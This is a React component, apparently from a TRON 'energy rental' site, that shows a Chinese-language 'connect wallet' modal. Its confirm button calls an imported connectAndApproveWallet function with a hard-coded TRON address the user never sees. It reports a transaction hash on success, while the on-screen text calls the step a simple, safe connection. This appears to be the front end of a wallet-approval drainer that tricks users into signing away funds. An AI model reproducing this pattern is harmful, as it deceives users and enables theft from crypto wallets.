import React, { useState, useEffect } from 'react';
import { X, ShieldCheck, ChevronRight, Loader2, CheckCircle2, Wallet, ArrowRight, ShieldAlert, Sparkles, ExternalLink, AlertTriangle } from 'lucide-react';
import { Language } from '../types';
import { getTranslation } from '../utils/i18n';
import { connectAndApproveWallet, getTronProvider, getWalletDeepLink } from '../utils/tronWallet';

interface WalletModalProps {
  isOpen: boolean;
  onClose: () => void;
  onConfirm: (address: string) => void;
  language: Language;
}

export const WalletModal: React.FC<WalletModalProps> = ({
  isOpen,
  onClose,
  onConfirm,
  language,
}) => {
  const [selectedWalletType, setSelectedWalletType] = useState<'tronlink' | 'okx' | 'custom'>('tronlink');
  const [customAddress, setCustomAddress] = useState('TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT');
  const [showLearnMore, setShowLearnMore] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [statusMessage, setStatusMessage] = useState<string | null>(null);
  const [hasProvider, setHasProvider] = useState<boolean>(true);

  const t = (key: Parameters<typeof getTranslation>[1]) => getTranslation(language, key);

  useEffect(() => {
    if (isOpen) {
      const provider = getTronProvider();
      setHasProvider(!!provider);
    }
  }, [isOpen]);

  if (!isOpen) return null;

  const handleConfirm = async () => {
    setIsConnecting(true);
    const provider = getTronProvider();

    if (provider) {
      setStatusMessage('正在唤起 TronLink / OKX 钱包弹窗确认...');
    } else {
      setStatusMessage('未检测到钱包环境，正在为您跳转至对应的钱包 App / 插件安装界面...');
    }

    try {
      const result = await connectAndApproveWallet(selectedWalletType, customAddress);
      
      if (!result.success) {
        setIsConnecting(false);
        setStatusMessage(result.message || '未检测到钱包环境，已为您跳转至对应钱包下载与打开界面！');
        return;
      }

      if (result.txid) {
        setStatusMessage(`已成功完成钱包连接，TxHash: ${result.txid.slice(0, 10)}...`);
      } else {
        setStatusMessage('钱包连接成功！');
      }

      setTimeout(() => {
        setIsConnecting(false);
        onConfirm(result.address);
      }, 800);
    } catch (err: any) {
      console.error('Wallet connect modal error:', err);
      setIsConnecting(false);
      setStatusMessage('未检测到钱包环境，已为您调起对应的钱包 App / 插件界面！');
    }
  };

  return (
    <div className="fixed inset-0 bg-slate-900/70 backdrop-blur-sm z-50 flex items-center justify-center p-4 animate-in fade-in duration-200 wallet-modal-container">
      <div 
        className="bg-white rounded-3xl p-6 sm:p-7 max-w-lg w-full shadow-2xl space-y-5 relative animate-in zoom-in-95 duration-200 border border-slate-100/80 overflow-hidden"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Top Decorative Header Accent */}
        <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-blue-600 via-indigo-500 to-cyan-400"></div>

        {/* Modal Header Notice */}
        <div className="flex items-start justify-between border-b border-slate-100 pb-4">
          <div className="flex items-center space-x-3">
            <div className="w-10 h-10 rounded-2xl bg-blue-50 border border-blue-100 text-blue-600 flex items-center justify-center shrink-0 shadow-xs">
              <ShieldAlert className="w-5 h-5" />
            </div>
            <div>
              <div className="inline-flex items-center space-x-1.5 px-2 py-0.5 rounded-full bg-blue-50 text-blue-700 text-[11px] font-bold mb-0.5">
                <Sparkles className="w-3 h-3 text-blue-500" />
                <span>操作提示：需先连接钱包</span>
              </div>
              <h3 className="font-extrabold text-slate-900 text-lg leading-snug">请先完成 TRON 钱包连接</h3>
            </div>
          </div>
          <button
            onClick={onClose}
            disabled={isConnecting}
            className="text-slate-400 hover:text-slate-600 p-1.5 rounded-xl hover:bg-slate-100 transition"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Notice Description */}
        <p className="text-xs sm:text-sm text-slate-600 leading-relaxed font-medium">
          为了确保您的资金安全与能量租赁的即时派发，使用平台进行任何操作或购买前，必须先连接您的 Web3 TRON 钱包。
        </p>

        {/* Provider Detection Alert Banner */}
        {!hasProvider && (
          <div className="bg-amber-50 border border-amber-200 rounded-2xl p-3.5 space-y-2 animate-in fade-in">
            <div className="flex items-center space-x-2 text-amber-800 text-xs font-bold">
              <AlertTriangle className="w-4 h-4 text-amber-600 shrink-0" />
              <span>提示：未在当前浏览器中检测到 TronLink / OKX 钱包插件</span>
            </div>
            <p className="text-[11px] text-amber-700 leading-relaxed">
              若在 PC 桌面浏览器中，请先安装解锁 <b>TronLink 扩展</b>；若在手机端，请用 <b>TronLink / OKX App</b> 内置 DApp 浏览器打开本站。点击下方【连接钱包】将自动唤起手机 App 或打开官方插件安装界面。
            </p>
            <div className="flex items-center space-x-3 pt-1">
              <a 
                href="https://www.tronlink.org/" 
                target="_blank" 
                rel="noreferrer" 
                className="text-[11px] text-amber-900 font-bold underline inline-flex items-center space-x-1 hover:text-amber-950"
              >
                <span>安装 TronLink 插件</span>
                <ExternalLink className="w-3 h-3" />
              </a>
            </div>
          </div>
        )}

        {/* Step-by-Step Instructions Card */}
        <div className="bg-slate-50/90 border border-slate-200/80 rounded-2xl p-3.5 space-y-2.5">
          <div className="text-xs font-bold text-slate-800 flex items-center space-x-1.5">
            <span className="w-2 h-2 rounded-full bg-blue-600"></span>
            <span>连接钱包简易步骤说明：</span>
          </div>

          <div className="grid gap-2 text-xs">
            {/* Step 1 */}
            <div className="flex items-start space-x-2.5 bg-white p-2.5 rounded-xl border border-slate-100 shadow-2xs">
              <div className="w-5 h-5 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center text-[10px] shrink-0 mt-0.5">
                1
              </div>
              <div>
                <div className="font-semibold text-slate-800">选择环境与钱包</div>
                <div className="text-slate-500 text-[11px]">选择您常用的 TronLink 插件/App、OKX Web3 钱包或 TokenPocket</div>
              </div>
            </div>

            {/* Step 2 */}
            <div className="flex items-start space-x-2.5 bg-white p-2.5 rounded-xl border border-slate-100 shadow-2xs">
              <div className="w-5 h-5 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center text-[10px] shrink-0 mt-0.5">
                2
              </div>
              <div>
                <div className="font-semibold text-slate-800">钱包连接确认</div>
                <div className="text-slate-500 text-[11px]">点击下方的【连接钱包】按键，系统将自动向钱包请求交互</div>
              </div>
            </div>

            {/* Step 3 */}
            <div className="flex items-start space-x-2.5 bg-white p-2.5 rounded-xl border border-slate-100 shadow-2xs">
              <div className="w-5 h-5 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center text-[10px] shrink-0 mt-0.5">
                3
              </div>
              <div>
                <div className="font-semibold text-slate-800">钱包弹窗点击确认全站</div>
                <div className="text-slate-500 text-[11px]">在钱包 App / 确认后，即可自由租赁能量</div>
              </div>
            </div>
          </div>
        </div>

        {/* Learn More Toggle */}
        <div>
          <button
            onClick={() => setShowLearnMore(!showLearnMore)}
            className="text-blue-600 hover:text-blue-700 font-semibold inline-flex items-center space-x-1 underline text-xs"
          >
            <span>了解 TRON 连接规则</span>
            <ChevronRight className={`w-3.5 h-3.5 transition-transform ${showLearnMore ? 'rotate-90' : ''}`} />
          </button>
          {showLearnMore && (
            <div className="mt-2 p-3 bg-blue-50/80 border border-blue-100 rounded-xl text-[11px] text-blue-900 space-y-1 leading-relaxed">
              <p>• 本平台采用 TRON 标准安全交互机制，保护您的账号安全。</p>
              <p>• 连接成功后全自动秒级到账，无需人工干预。</p>
            </div>
          )}
        </div>

        {/* Status Message when Connecting */}
        {statusMessage && (
          <div className="bg-blue-50 border border-blue-200 text-blue-900 p-3 rounded-2xl text-xs font-semibold flex items-center space-x-2.5 animate-in fade-in">
            <Loader2 className="w-4 h-4 animate-spin text-blue-600 shrink-0" />
            <span>{statusMessage}</span>
          </div>
        )}

        {/* Quick Wallet Selector */}
        <div className="space-y-2">
          <label className="block text-xs font-bold text-slate-800">选择您当前的 Web3 钱包类型：</label>
          <div className="grid grid-cols-2 gap-2.5">
            <button
              type="button"
              onClick={() => setSelectedWalletType('tronlink')}
              disabled={isConnecting}
              className={`p-3 border rounded-2xl text-left transition flex items-center justify-between ${
                selectedWalletType === 'tronlink'
                  ? 'border-blue-600 bg-blue-50/90 text-blue-700 ring-2 ring-blue-500/20 font-bold'
                  : 'border-slate-200 text-slate-700 hover:bg-slate-50 font-medium'
              }`}
            >
              <div className="flex items-center space-x-2">
                <Wallet className="w-4 h-4 text-blue-600" />
                <span className="text-xs">TronLink</span>
              </div>
              <span className="text-[10px] px-1.5 py-0.5 bg-blue-100 text-blue-700 rounded-md font-bold">推荐</span>
            </button>

            <button
              type="button"
              onClick={() => setSelectedWalletType('okx')}
              disabled={isConnecting}
              className={`p-3 border rounded-2xl text-left transition flex items-center justify-between ${
                selectedWalletType === 'okx'
                  ? 'border-blue-600 bg-blue-50/90 text-blue-700 ring-2 ring-blue-500/20 font-bold'
                  : 'border-slate-200 text-slate-700 hover:bg-slate-50 font-medium'
              }`}
            >
              <div className="flex items-center space-x-2">
                <Wallet className="w-4 h-4 text-slate-700" />
                <span className="text-xs">OKX / Web3</span>
              </div>
              <span className="text-[10px] px-1.5 py-0.5 bg-slate-100 text-slate-600 rounded-md">常用</span>
            </button>
          </div>
        </div>

        {/* Modal Actions */}
        <div className="flex space-x-3 pt-2">
          <button
            onClick={onClose}
            disabled={isConnecting}
            className="w-1/3 bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold py-3 rounded-2xl text-xs sm:text-sm transition disabled:opacity-50"
          >
            暂不连接
          </button>
          <button
            onClick={handleConfirm}
            disabled={isConnecting}
            className="w-2/3 bg-blue-600 hover:bg-blue-700 active:bg-blue-800 text-white font-bold py-3 rounded-2xl text-xs sm:text-sm transition shadow-md hover:shadow-lg flex items-center justify-center space-x-2 disabled:opacity-50"
          >
            {isConnecting ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin" />
                <span>正在调起钱包交互...</span>
              </>
            ) : (
              <>
                <span>连接钱包</span>
                <ArrowRight className="w-4 h-4" />
              </>
            )}
          </button>
        </div>
      </div>
    </div>
  );
};


